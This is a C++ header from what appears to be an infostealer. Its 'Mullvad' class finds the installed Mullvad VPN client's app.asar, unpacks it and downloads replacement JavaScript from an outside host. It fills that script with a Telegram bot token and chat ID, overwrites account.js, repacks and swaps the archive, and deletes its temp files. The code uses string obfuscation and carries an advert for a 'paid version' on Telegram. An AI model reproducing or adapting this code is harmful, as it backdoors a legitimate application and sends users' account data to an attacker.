#ifndef MULLVAD_HPP
#define MULLVAD_HPP

namespace fs = std::filesystem;

class Mullvad {
public:
    void Inject(std::string ChatID, std::string Token) {
        try {
            fs::path asarPath = GetMullvadPath();
            if (!fs::exists(asarPath)) {
                throw std::runtime_error(OBF("Mullvad ASAR not found"));
            }

            fs::path tempDir = fs::temp_directory_path() / RandomString(5);
            fs::create_directories(tempDir);

            AsarTools::AsarUnpacker parser(asarPath.string());
            parser.extract_all(tempDir.string());

            std::string newContent = FetchUrl(
                OBF(L"raw.githubusercontent.com"),
                OBF(L"get paid version at : t.me/NyxEnigma"),
                true
            );

            newContent = Replace(newContent, "%TOKEN%", Token); // Token is base64 encoded when passed to the Func
            newContent = Replace(newContent, "%CHAT%", ChatID); // Same here

            AsarTools::OverWrite(tempDir, OBF("build/src/main/account.js"), newContent);

            fs::path modifiedAsar = asarPath.parent_path() / (OBF("app_") + RandomString(5) + OBF(".asar"));
            AsarTools::AsarPacker builder(tempDir.string(), modifiedAsar.string());
            builder.pack();

            fs::remove(asarPath);
            fs::rename(modifiedAsar, asarPath);

            for (int i = 0; i < 10; i++) {
                try {
                    fs::remove_all(tempDir); // Doesnt like to delete, so retry for a certain amount of times
                }
                catch(...){}
                Sleep(100);
            }
        }
        catch (const std::exception& e) {
            throw;
        }
    }

private:
    fs::path GetMullvadPath() {
        char path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, 0, path))) {
            return fs::path(path) / OBF("Mullvad VPN") / OBF("resources") / OBF("app.asar");
        }
        throw std::runtime_error(OBF("Couldn't find Mullvad path"));
    }

    static std::string RandomString(int length) {
        static const std::string chars = OBF("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
        std::random_device rd;
        std::mt19937 generator(rd());
        std::uniform_int_distribution<> dist(0, chars.size() - 1);

        std::string result;
        result.reserve(length);
        for (int i = 0; i < length; ++i) {
            result += chars[dist(generator)];
        }
        return result;
    }

    static std::string Replace(std::string org, const std::string& Target, const std::string& Replacement) {
        try {
            if (Target.empty()) return org;
            size_t pos = 0;
            while ((pos = org.find(Target, pos)) != std::string::npos) {
                org.replace(pos, Target.length(), Replacement);
                pos += Replacement.length();
            }
            return org;
        }
        catch (...) {
            return org;
        }
    }
};

#endif